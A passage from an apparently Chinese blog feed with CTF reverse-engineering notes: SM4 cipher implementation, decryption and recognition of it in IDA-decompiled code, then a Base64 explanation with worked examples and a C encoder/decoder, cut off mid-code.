key);</span><br><span class="line">	<span class="keyword">while</span> (i&lt;<span class="number">1000000</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		sm4_crypt_ecb(&amp;ctx, <span class="number">1</span>, <span class="number">16</span>, input, input);</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">16</span>; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%02x "</span>, input[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\thunder&gt;<span class="string">"D:\AlgorithmTest.exe"</span></span><br><span class="line">68 1e df 34 d2 06 96 5e 86 b3 e9 4f 53 6e 42 46</span><br><span class="line">01 23 45 67 89 ab <span class="built_in">cd</span> ef fe dc ba 98 76 54 32 10</span><br><span class="line">59 52 98 c7 c6 fd 27 1f 04 02 f8 04 c3 3d 3f 66</span><br></pre></td></tr></table></figure>
<h1 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h1><p>pysm4是国密SM4算法的Python实现，<a href="https://github.com/yang3yen/pysm4" target="_blank" rel="noopener">这里下载</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pysm4 <span class="keyword">import</span> encrypt, decrypt</span><br><span class="line"><span class="comment"># 明文</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>clear_num = <span class="number">0x0123456789abcdeffedcba9876543210</span></span><br><span class="line"><span class="comment"># 密钥</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>mk = <span class="number">0x0123456789abcdeffedcba9876543210</span></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>cipher_num = encrypt(clear_num, mk)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(cipher_num)[<span class="number">2</span>:].replace(<span class="string">'L'</span>, <span class="string">''</span>)</span><br><span class="line"><span class="string">'681edf34d206965e86b3e94f536e4246'</span></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>clear_num == decrypt(cipher_num, mk)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
<h1 id="辨别"><a href="#辨别" class="headerlink" title="辨别"></a>辨别</h1><p>CTF逆向可以通过判断S盒的值来猜测SM4算法，通过S盒生成4个8位的字符，我们将上面实现代码放入IDA中查看，我们可以通过输入明文密钥的格式来猜测SM4算法</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  __int64 v1; <span class="comment">// ST0C_8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [esp+D0h] [ebp-E0h]</span></span><br><span class="line">  sm4_context ctx; <span class="comment">// [esp+DCh] [ebp-D4h]</span></span><br><span class="line">  <span class="keyword">char</span> output[<span class="number">16</span>]; <span class="comment">// [esp+168h] [ebp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> input[<span class="number">16</span>]; <span class="comment">// [esp+180h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> key[<span class="number">16</span>]; <span class="comment">// [esp+198h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  key[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  key[<span class="number">1</span>] = <span class="number">0x23</span>;</span><br><span class="line">  key[<span class="number">2</span>] = <span class="number">0x45</span>;</span><br><span class="line">  key[<span class="number">3</span>] = <span class="number">0x67</span>;</span><br><span class="line">  key[<span class="number">4</span>] = <span class="number">0x89</span>u;</span><br><span class="line">  key[<span class="number">5</span>] = <span class="number">0xAB</span>u;</span><br><span class="line">  key[<span class="number">6</span>] = <span class="number">0xCD</span>u;</span><br><span class="line">  key[<span class="number">7</span>] = <span class="number">0xEF</span>u;</span><br><span class="line">  key[<span class="number">8</span>] = <span class="number">0xFE</span>u;</span><br><span class="line">  key[<span class="number">9</span>] = <span class="number">0xDC</span>u;</span><br><span class="line">  key[<span class="number">10</span>] = <span class="number">0xBA</span>u;</span><br><span class="line">  key[<span class="number">11</span>] = <span class="number">0x98</span>u;</span><br><span class="line">  key[<span class="number">12</span>] = <span class="number">0x76</span>;</span><br><span class="line">  key[<span class="number">13</span>] = <span class="number">0x54</span>;</span><br><span class="line">  key[<span class="number">14</span>] = <span class="number">0x32</span>;</span><br><span class="line">  key[<span class="number">15</span>] = <span class="number">0x10</span>;</span><br><span class="line">  input[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  input[<span class="number">1</span>] = <span class="number">0x23</span>;</span><br><span class="line">  input[<span class="number">2</span>] = <span class="number">0x45</span>;</span><br><span class="line">  input[<span class="number">3</span>] = <span class="number">0x67</span>;</span><br><span class="line">  input[<span class="number">4</span>] = <span class="number">0x89</span>u;</span><br><span class="line">  input[<span class="number">5</span>] = <span class="number">0xAB</span>u;</span><br><span class="line">  input[<span class="number">6</span>] = <span class="number">0xCD</span>u;</span><br><span class="line">  input[<span class="number">7</span>] = <span class="number">0xEF</span>u;</span><br><span class="line">  input[<span class="number">8</span>] = <span class="number">0xFE</span>u;</span><br><span class="line">  input[<span class="number">9</span>] = <span class="number">0xDC</span>u;</span><br><span class="line">  input[<span class="number">10</span>] = <span class="number">0xBA</span>u;</span><br><span class="line">  input[<span class="number">11</span>] = <span class="number">0x98</span>u;</span><br><span class="line">  input[<span class="number">12</span>] = <span class="number">0x76</span>;</span><br><span class="line">  input[<span class="number">13</span>] = <span class="number">0x54</span>;</span><br><span class="line">  input[<span class="number">14</span>] = <span class="number">0x32</span>;</span><br><span class="line">  input[<span class="number">15</span>] = <span class="number">0x10</span>;</span><br><span class="line">  j__sm4_setkey_enc(&amp;ctx, key);</span><br><span class="line">  j__sm4_crypt_ecb(&amp;ctx, <span class="number">1</span>, <span class="number">16</span>, input, output);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i )</span><br><span class="line">    _printf(<span class="string">"%02x "</span>, (<span class="keyword">unsigned</span> __int8)output[i]);</span><br><span class="line">  _printf(<span class="string">"\n"</span>);</span><br><span class="line">  j__sm4_setkey_dec(&amp;ctx, key);</span><br><span class="line">  j__sm4_crypt_ecb(&amp;ctx, <span class="number">0</span>, <span class="number">16</span>, output, output);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i )</span><br><span class="line">    _printf(<span class="string">"%02x "</span>, (<span class="keyword">unsigned</span> __int8)output[i]);</span><br><span class="line">  _printf(<span class="string">"\n"</span>);</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  j__sm4_setkey_enc(&amp;ctx, key);</span><br><span class="line">  <span class="keyword">while</span> ( i &lt; <span class="number">0xF4240</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    j__sm4_crypt_ecb(&amp;ctx, <span class="number">1</span>, <span class="number">16</span>, input, input);</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i )</span><br><span class="line">    _printf(<span class="string">"%02x "</span>, (<span class="keyword">unsigned</span> __int8)input[i]);</span><br><span class="line">  _printf(<span class="string">"\n"</span>);</span><br><span class="line">  HIDWORD(v1) = v0;</span><br><span class="line">  LODWORD(v1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>算法中的T变换观察返回值也有很明显的特征</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sm4F</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> x0, <span class="keyword">unsigned</span> <span class="keyword">int</span> x1, <span class="keyword">unsigned</span> <span class="keyword">int</span> x2, <span class="keyword">unsigned</span> <span class="keyword">int</span> x3, <span class="keyword">unsigned</span> <span class="keyword">int</span> rk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x0 ^ (<span class="keyword">unsigned</span> __int64)sm4Lt(rk ^ x3 ^ x2 ^ x1); <span class="comment">//返回多组异或</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************************************/</span></span><br><span class="line"></span><br><span class="line">__int64 __<span class="function">cdecl <span class="title">sm4Lt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> ka)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 b; <span class="comment">// STD8_1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 b_1; <span class="comment">// STD9_1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 b_2; <span class="comment">// STDA_1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v4; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> bb; <span class="comment">// STFC_4</span></span><br><span class="line">  __int64 v6; <span class="comment">// ST00_8</span></span><br><span class="line"></span><br><span class="line">  b = sm4Sbox(SHIBYTE(ka));</span><br><span class="line">  b_1 = sm4Sbox(SBYTE2(ka));</span><br><span class="line">  b_2 = sm4Sbox(SBYTE1(ka));</span><br><span class="line">  v4 = sm4Sbox(ka);</span><br><span class="line">  bb = v4 | (b_2 &lt;&lt; <span class="number">8</span>) | (b_1 &lt;&lt; <span class="number">16</span>) | (b &lt;&lt; <span class="number">24</span>); <span class="comment">// 分4组每组8位计算</span></span><br><span class="line">  HIDWORD(v6) = (bb &gt;&gt; <span class="number">8</span>) | (bb &lt;&lt; <span class="number">24</span>);</span><br><span class="line">  LODWORD(v6) = HIDWORD(v6) ^ ((bb &gt;&gt; <span class="number">14</span>) | (bb &lt;&lt; <span class="number">18</span>)) ^ ((bb &gt;&gt; <span class="number">22</span>) | (bb &lt;&lt; <span class="number">10</span>)) ^ bb ^ ((bb &gt;&gt; <span class="number">30</span>) | <span class="number">4</span> * bb);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>2019ciscn-bbvvmm</p>
<p>下面的代码和上面的对比可以很容易的猜到SM4</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_400EE2</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 ^ sub_400D87(a5 ^ a4 ^ a3 ^ a2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/************************************************************************************************/</span></span><br><span class="line"></span><br><span class="line">__int64 __<span class="function">cdecl <span class="title">sm4Lt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> ka)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 b; <span class="comment">// STD8_1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 b_1; <span class="comment">// STD9_1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 b_2; <span class="comment">// STDA_1</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v4; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> bb; <span class="comment">// STFC_4</span></span><br><span class="line">  __int64 v6; <span class="comment">// ST00_8</span></span><br><span class="line"></span><br><span class="line">  b = sm4Sbox(SHIBYTE(ka));</span><br><span class="line">  b_1 = sm4Sbox(SBYTE2(ka));</span><br><span class="line">  b_2 = sm4Sbox(SBYTE1(ka));</span><br><span class="line">  v4 = sm4Sbox(ka);</span><br><span class="line">  bb = v4 | (b_2 &lt;&lt; <span class="number">8</span>) | (b_1 &lt;&lt; <span class="number">16</span>) | (b &lt;&lt; <span class="number">24</span>);</span><br><span class="line">  HIDWORD(v6) = (bb &gt;&gt; <span class="number">8</span>) | (bb &lt;&lt; <span class="number">24</span>);</span><br><span class="line">  LODWORD(v6) = HIDWORD(v6) ^ ((bb &gt;&gt; <span class="number">14</span>) | (bb &lt;&lt; <span class="number">18</span>)) ^ ((bb &gt;&gt; <span class="number">22</span>) | (bb &lt;&lt; <span class="number">10</span>)) ^ bb ^ ((bb &gt;&gt; <span class="number">30</span>) | <span class="number">4</span> * bb);</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参考链接：</p>
<p><a href="https://neuqzxy.github.io/2017/06/15/%E6%AC%A3%E4%BB%94%E5%B8%A6%E4%BD%A0%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8SM4%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/" target="_blank" rel="noopener">https://neuqzxy.github.io/2017/06/15/%E6%AC%A3%E4%BB%94%E5%B8%A6%E4%BD%A0%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8SM4%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/</a></p>
<p><a href="https://baike.baidu.com/item/SM4.0/3901780?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/SM4.0/3901780?fr=aladdin</a></p>
<p><a href="https://max.book118.com/html/2018/1023/8017013004001130.shtm" target="_blank" rel="noopener">https://max.book118.com/html/2018/1023/8017013004001130.shtm</a></p>
<p><a href="https://blog.csdn.net/cg129054036/article/details/83012721" target="_blank" rel="noopener">https://blog.csdn.net/cg129054036/article/details/83012721</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>密码篇</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学逆向之Base系列</title>
    <url>/2019/05/21/%E5%AF%86%E7%A0%81%E5%AD%A6%E9%80%86%E5%90%91%E4%B9%8BBase%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<h1 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Base64可以将ASCII字符串或者是二进制编码成只包含A—Z，a—z，0—9，+，/ 这64个字符（ 26个大写字母，26个小写字母，10个数字，1个+，一个 / 刚好64个字符）。这64个字符用6个bit位就可以全部表示出来，一个字节有8个bit 位，那么还剩下两个bit位，这两个bit位用0来补充。其实，一个Base64字符仍然是8个bit位，但是有效部分只有右边的6个 bit，左边两个永远是0。Base64的编码规则是将3个8位字节(3×8=24位)编码成4个6位的字节(4×6=24位)，之后在每个6位字节前面，补充两个0，形成4个8位字节的形式，那么取值范围就变成了0~63。又因为2的6次方等于64，所以每6个位组成一个单元。一般在CTF逆向题目中base64的加密过程主要是用自定义的索引表，所以如果能一眼能看出是base64加密就会节约很多时间。</p>
<h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h2><ul>
<li>base64的编码都是按字符串长度，以每3个8bit的字符为一组，</li>
<li>然后针对每组，首先获取每个字符的ASCII编码，</li>
<li>然后将ASCII编码转换成8bit的二进制，得到一组3*8=24bit的字节</li>
<li>然后再将这24bit划分为4个6bit的字节，并在每个6bit的字节前面都填两个高位0，得到4个8bit的字节</li>
<li>然后将这4个8bit的字节转换成10进制，对照Base64编码表 ，得到对应编码后的字符。</li>
</ul>
<p>索引表如下</p>
<table>
<thead>
<tr>
<th><strong>索引</strong></th>
<th><strong>对应字符</strong></th>
<th><strong>索引</strong></th>
<th><strong>对应字符</strong></th>
<th><strong>索引</strong></th>
<th><strong>对应字符</strong></th>
<th><strong>索引</strong></th>
<th><strong>对应字符</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td><strong>A</strong></td>
<td>17</td>
<td><strong>R</strong></td>
<td>34</td>
<td><strong>i</strong></td>
<td>51</td>
<td><strong>z</strong></td>
</tr>
<tr>
<td>1</td>
<td><strong>B</strong></td>
<td>18</td>
<td><strong>S</strong></td>
<td>35</td>
<td><strong>j</strong></td>
<td>52</td>
<td><strong>0</strong></td>
</tr>
<tr>
<td>2</td>
<td><strong>C</strong></td>
<td>19</td>
<td><strong>T</strong></td>
<td>36</td>
<td><strong>k</strong></td>
<td>53</td>
<td><strong>1</strong></td>
</tr>
<tr>
<td>3</td>
<td><strong>D</strong></td>
<td>20</td>
<td><strong>U</strong></td>
<td>37</td>
<td><strong>l</strong></td>
<td>54</td>
<td><strong>2</strong></td>
</tr>
<tr>
<td>4</td>
<td><strong>E</strong></td>
<td>21</td>
<td><strong>V</strong></td>
<td>38</td>
<td><strong>m</strong></td>
<td>55</td>
<td><strong>3</strong></td>
</tr>
<tr>
<td>5</td>
<td><strong>F</strong></td>
<td>22</td>
<td><strong>W</strong></td>
<td>39</td>
<td><strong>n</strong></td>
<td>56</td>
<td><strong>4</strong></td>
</tr>
<tr>
<td>6</td>
<td><strong>G</strong></td>
<td>23</td>
<td><strong>X</strong></td>
<td>40</td>
<td><strong>o</strong></td>
<td>57</td>
<td><strong>5</strong></td>
</tr>
<tr>
<td>7</td>
<td><strong>H</strong></td>
<td>24</td>
<td><strong>Y</strong></td>
<td>41</td>
<td><strong>p</strong></td>
<td>58</td>
<td><strong>6</strong></td>
</tr>
<tr>
<td>8</td>
<td><strong>I</strong></td>
<td>25</td>
<td><strong>Z</strong></td>
<td>42</td>
<td><strong>q</strong></td>
<td>59</td>
<td><strong>7</strong></td>
</tr>
<tr>
<td>9</td>
<td><strong>J</strong></td>
<td>26</td>
<td><strong>a</strong></td>
<td>43</td>
<td><strong>r</strong></td>
<td>60</td>
<td><strong>8</strong></td>
</tr>
<tr>
<td>10</td>
<td><strong>K</strong></td>
<td>27</td>
<td><strong>b</strong></td>
<td>44</td>
<td><strong>s</strong></td>
<td>61</td>
<td><strong>9</strong></td>
</tr>
<tr>
<td>11</td>
<td><strong>L</strong></td>
<td>28</td>
<td><strong>c</strong></td>
<td>45</td>
<td><strong>t</strong></td>
<td>62</td>
<td><strong>+</strong></td>
</tr>
<tr>
<td>12</td>
<td><strong>M</strong></td>
<td>29</td>
<td><strong>d</strong></td>
<td>46</td>
<td><strong>u</strong></td>
<td>63</td>
<td><strong>/</strong></td>
</tr>
<tr>
<td>13</td>
<td><strong>N</strong></td>
<td>30</td>
<td><strong>e</strong></td>
<td>47</td>
<td><strong>v</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>14</td>
<td><strong>O</strong></td>
<td>31</td>
<td><strong>f</strong></td>
<td>48</td>
<td><strong>w</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>15</td>
<td><strong>P</strong></td>
<td>32</td>
<td><strong>g</strong></td>
<td>49</td>
<td><strong>x</strong></td>
<td></td>
<td></td>
</tr>
<tr>
<td>16</td>
<td><strong>Q</strong></td>
<td>33</td>
<td><strong>h</strong></td>
<td>50</td>
<td><strong>y</strong></td>
<td></td>
</tr>
</tbody>
</table>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>第一个例子以base64加密SLF为例子，过程如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符串      S       L        F</span><br><span class="line">ASCII      83      80       76</span><br><span class="line">二进制   01010011‬  01001100  01000110</span><br><span class="line">合并       01010011‬0100110001000110</span><br><span class="line">6位      010100     110100	 110001    000110</span><br><span class="line">补零	 00010100   00110100   00110001	 00000110</span><br><span class="line">进制       20        52         49         6</span><br><span class="line">对照       U         0          x          G</span><br><span class="line"></span><br><span class="line">SLF -&gt; U0xG</span><br></pre></td></tr></table></figure>
<p>第二个例子以base64加密M为例子，过程如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字符串      M</span><br><span class="line">ASCII      77</span><br><span class="line">二进进   01001101</span><br><span class="line">合并     01001101</span><br><span class="line">6位      010011     01</span><br><span class="line">补零	 00010011   00010000</span><br><span class="line">进制       19        16</span><br><span class="line">对照       T         Q         =         =</span><br><span class="line"></span><br><span class="line">M -&gt; TQ==</span><br></pre></td></tr></table></figure>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>最上面的base64char索引表可以自定义，这里用c实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局常量定义</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> * base64char = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> padding_char = <span class="string">'='</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*编码代码</span></span><br><span class="line"><span class="comment">* const unsigned char * sourcedata， 源数组</span></span><br><span class="line"><span class="comment">* char * base64 ，码字保存</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">base64_encode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> * sourcedata, <span class="keyword">char</span> * base64)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> trans_index = <span class="number">0</span>;    <span class="comment">// 索引是8位，但是高两位都为0</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">int</span> datalength = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span>*)sourcedata);</span><br><span class="line">	<span class="keyword">for</span> (; i &lt; datalength; i += <span class="number">3</span>)&#123;</span><br><span class="line">		<span class="comment">// 每三个一组，进行编码</span></span><br><span class="line">		<span class="comment">// 要编码的数字的第一个</span></span><br><span class="line">		trans_index = ((sourcedata[i] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3f</span>);</span><br><span class="line">		base64[j++] = base64char[(<span class="keyword">int</span>)trans_index];</span><br><span class="line">		<span class="comment">// 第二个</span></span><br><span class="line">		trans_index = ((sourcedata[i] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0x30</span>);</span><br><span class="line">		<span class="keyword">if</span> (i + <span class="number">1</span> &lt; datalength)&#123;</span><br><span class="line">			trans_index |= ((sourcedata[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0f</span>);</span><br><span class="line">			base64[j++] = base64char[(<span class="keyword">int</span>)trans_index];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			base64[j++] = base64char[(<span class="keyword">int</span>)trans_index];</span><br><span class="line"></span><br><span class="line">			base64[j++] = padding_char;</span><br><span class="line"></span><br><span class="line">			base64[j++] = padding_char;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">break</span>;   <span class="comment">// 超出总长度，可以直接break</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 第三个</span></span><br><span class="line">		trans_index = ((sourcedata[i + <span class="number">1</span>] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0x3c</span>);</span><br><span class="line">		<span class="keyword">if</span> (i + <span class="number">2</span> &lt; datalength)&#123; <span class="comment">// 有的话需要编码2个</span></span><br><span class="line">			trans_index |= ((sourcedata[i + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x03</span>);</span><br><span class="line">			base64[j++] = base64char[(<span class="keyword">int</span>)trans_index];</span><br><span class="line"></span><br><span class="line">			trans_index = sourcedata[i + <span class="number">2</span>] &amp; <span class="number">0x3f</span>;</span><br><span class="line">			base64[j++] = base64char[(<span class="keyword">int</span>)trans_index];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			base64[j++] = base64char[(<span class="keyword">int</span>)trans_index];</span><br><span class="line"></span><br><span class="line">			base64[j++] = padding_char;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	base64[j] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 在字符串中查询特定字符位置索引</span></span><br><span class="line"><span class="comment">* const char *str ，字符串</span></span><br><span class="line"><span class="comment">* char c，要查找的字符</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">num_strchr</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">char</span> c)</span> <span class="comment">// </span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *pindex = <span class="built_in">strchr</span>(str, c);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == pindex)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> pindex - str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 解码</span></span><br><span class="line"><span class="comment">* const char * base64 码字</span></span><br><span class="line"><span class="comment">* unsigned char * dedata， 解码恢复的数据</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">base64_decode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * base64, <span class="keyword">unsigned</span> <span class="keyword">char</span> * dedata)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> trans[<span class="number">4</span>] = &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (; base64[i] != <span class="string">'\0'</span>; i += <span class="number">4</span>)&#123;</span><br><span class="line">		<span class="comment">// 每四个一组，译码成三个字符</span></span><br><span class="line">		trans[<span class="number">0</span>] = num_strchr(base64char, base64[i]);</span><br><span class="line">		trans[<span class="number">1</span>] = num_strchr(base64char, base64[i + <span class="number">1</span>]);</span><br><span class="line">		<span class="comment">// 1/3</span></span><br><span class="line">		dedata[j++] = ((trans[<span class="number">0</span>] &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xfc</span>) | ((trans[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x03</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (base64[i + <span class="number">2</span>] == <span class="string">'='</span>)&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			trans[<span class="number">2</span>] = num_strchr(base64char, base64[i + <span class="number">2</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 2/3</span></span><br><span class="line">		dedata[j++] = ((trans[<span class="number">1</span>] &lt;&lt; <span class="number">4</span>) &amp; <span class="number">0xf0</span>) | ((trans[<span class="number">2</span>] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x0f</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (base64[i + <span class="number">3</span>] == <span class="string">'='</span>)&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			trans[<span class="number">3</span>] = num_strchr(base64char, base64[i + <span class="number">3</span>]);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 3/3</span></span><br><span class="line">		dedata[j++] = ((trans[<span class="number">2</span>] &lt;&lt; <span class="number">6</span>) &amp; <span class="number">0xc0</span>) | (trans[<span class="number">3</span>] &amp; <span class="number">0x3f</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dedata[j] = <span class="string">'\0'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> str[] = <span class="string">"a45rbcd"</span>;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *sourcedata = str;</span><br><span class="line">	<span class="keyword">char</span> 